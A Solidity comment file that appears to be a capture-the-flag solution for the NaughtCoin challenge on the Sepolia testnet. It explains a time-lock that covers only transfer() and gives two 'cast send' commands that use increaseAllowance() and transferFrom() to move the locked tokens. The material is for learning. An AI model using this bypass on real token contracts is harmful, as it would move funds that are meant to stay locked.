// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

The pwned contract inherits from the ERC20 token and adds a time-lock restriction on the transfer() function.
However it forgets to add the same restrictions on the inherited transferFrom() and increaseAllowance() functions.
This allows the sender to easily unlock the tokens by using increaseAllowance() and transferFrom() to transfer
the tokens to another address.

> cast send --rpc-url ${SEPOLIA_RPC_URL} --account updraft ${NAUGHTCOIN_INSTANCE_ADDRESS}
        "increaseAllowance(address,uint256)" ${OWN_ADDRESS} 1000000000000000000000000

> cast send --rpc-url ${SEPOLIA_RPC_URL} --account updraft ${NAUGHTCOIN_INSTANCE_ADDRESS}
        "transferFrom(address,address,uint256)" ${OWN_ADDRESS} ${OWN_ADDRESS_2} 1000000000000000000000000

*/